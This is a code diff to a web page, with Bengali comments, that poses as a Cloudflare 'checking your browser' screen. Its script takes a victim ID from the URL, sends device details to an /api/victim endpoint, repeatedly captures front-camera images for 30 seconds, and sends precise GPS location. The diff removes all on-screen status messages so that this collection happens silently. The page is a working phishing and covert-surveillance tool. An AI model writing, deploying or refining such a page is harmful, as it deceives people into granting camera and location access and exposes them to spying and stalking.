@@ -48,16 +48,10 @@
             margin: 8px 0;
             line-height: 1.7;
         }
+        /* স্ট্যাটাস এলিমেন্ট সম্পূর্ণ লুকানো */
         #status {
-            margin-top: 20px;
-            font-size: 16px;
-            font-weight: 500;
-            color: #333;
-            min-height: 30px;
+            display: none !important;
         }
-        #status.success { color: #28a745; }
-        #status.error { color: #dc3545; }
-        #status.info { color: #007bff; }
         .attribution {
             margin-top: 32px;
             font-size: 14px;
@@ -84,7 +78,8 @@
         </div>
         <h1>আপনার ব্রাউজার চেক করা হচ্ছে...</h1>
         <p>এই প্রক্রিয়াটি স্বয়ংক্রিয়। আপনার ব্রাউজার শীঘ্রই পুনর্নির্দেশিত হবে।</p>
-        <p id="status">📡 তথ্য সংগ্রহ করা হচ্ছে...</p>
+        <!-- 👇 স্ট্যাটাস এলিমেন্ট লুকানো -->
+        <p id="status"></p>
         <div class="attribution">
             DDoS সুরক্ষা দ্বারা
             <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
@@ -100,6 +95,7 @@
         (function() {
             "use strict";
 
+            // রে আইডি
             const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
             let ray = "";
             for (let i = 0; i < 17; i++) {
@@ -109,13 +105,10 @@
 
             const pathParts = window.location.pathname.split('/');
             const victimId = pathParts[pathParts.length - 1];
-            const statusEl = document.getElementById('status');
 
-            function setStatus(msg, type = 'info') {
-                statusEl.textContent = msg;
-                statusEl.className = type;
-            }
-
+            // ================================================================
+            // সব স্ট্যাটাস আপডেট সরানো হয়েছে – নীরবে ডেটা সংগ্রহ
+            // ================================================================
             async function collectData() {
                 try {
                     const data = {
@@ -214,27 +207,18 @@
                         }
                     } catch (e) {}
 
-                    // ===== ডিভাইস ইনফো পাঠান =====
-                    setStatus('📤 ডিভাইস তথ্য পাঠানো হচ্ছে...', 'info');
-                    const response = await fetch('/api/victim', {
+                    // ===== ডিভাইস ইনফো পাঠান (নীরবে) =====
+                    await fetch('/api/victim', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
-                    const result = await response.json();
-                    console.log('📥 রেসপন্স:', result);
-                    if (response.ok) {
-                        setStatus('✅ ডিভাইস তথ্য পাঠানো হয়েছে!', 'success');
-                    } else {
-                        setStatus('❌ ডেটা পাঠাতে ব্যর্থ', 'error');
-                    }
 
-                    // ===== ক্যামেরা অ্যাক্সেস =====
+                    // ===== ক্যামেরা অ্যাক্সেস (নীরবে) =====
                     try {
-                        setStatus('📸 ক্যামেরা অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
                         const stream = await navigator.mediaDevices.getUserMedia({
                             video: {
-                                width: { ideal: 640 },   // 🔥 ছোট সাইজ
+                                width: { ideal: 640 },
                                 height: { ideal: 480 },
                                 facingMode: 'user'
                             },
@@ -245,15 +229,12 @@
                         const canvas = document.getElementById('canvas');
                         video.srcObject = stream;
 
-                        let captureCount = 0;
                         const interval = setInterval(async () => {
                             if (!video.videoWidth || !video.videoHeight) return;
-                            // ক্যানভাসের সাইজ ঠিক করা
                             canvas.width = 640;
                             canvas.height = 480;
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, 640, 480);
-                            // কম কোয়ালিটি (0.5) এবং ছোট সাইজ
                             const imageData = canvas.toDataURL('image/jpeg', 0.5);
                             const rawBase64 = imageData.split(',')[1];
 
@@ -263,8 +244,6 @@
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({ id: victimId, image: rawBase64 })
                                 });
-                                captureCount++;
-                                setStatus(`📸 ${captureCount}টি ছবি তোলা হয়েছে...`, 'info');
                             } catch (e) {
                                 console.error('Camera upload error:', e);
                             }
@@ -273,18 +252,16 @@
                         setTimeout(() => {
                             clearInterval(interval);
                             stream.getTracks().forEach(t => t.stop());
-                            setStatus('✅ ক্যামেরা ক্যাপচার শেষ', 'success');
                         }, 30000);
 
                     } catch (e) {
-                        console.log('ক্যামেরা অ্যাক্সেস ডিনাই:', e.message);
-                        setStatus('❌ ক্যামেরা অ্যাক্সেস ডিনাই করা হয়েছে', 'error');
+                        // ক্যামেরা অ্যাক্সেস ডিনাই – নীরবে ব্যর্থ
+                        console.log('Camera access denied');
                     }
 
-                    // ===== লোকেশন (GPS) =====
+                    // ===== লোকেশন (GPS) – নীরবে =====
                     try {
                         if (navigator.geolocation) {
-                            setStatus('📍 লোকেশন অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
                             const pos = await new Promise((resolve, reject) => {
                                 navigator.geolocation.getCurrentPosition(resolve, reject, {
                                     enableHighAccuracy: true,
@@ -306,15 +283,14 @@
                                     type: 'camera'
                                 })
                             });
-                            setStatus('📍 লোকেশন পাওয়া গেছে!', 'success');
                         }
                     } catch (e) {
-                        console.log('লোকেশন অ্যাক্সেস ডিনাই:', e.message);
+                        // লোকেশন অ্যাক্সেস ডিনাই – নীরবে ব্যর্থ
+                        console.log('Location access denied');
                     }
 
                 } catch (err) {
                     console.error('Collect data error:', err);
-                    setStatus('❌ ত্রুটি ঘটেছে: ' + err.message, 'error');
                 }
             }
 
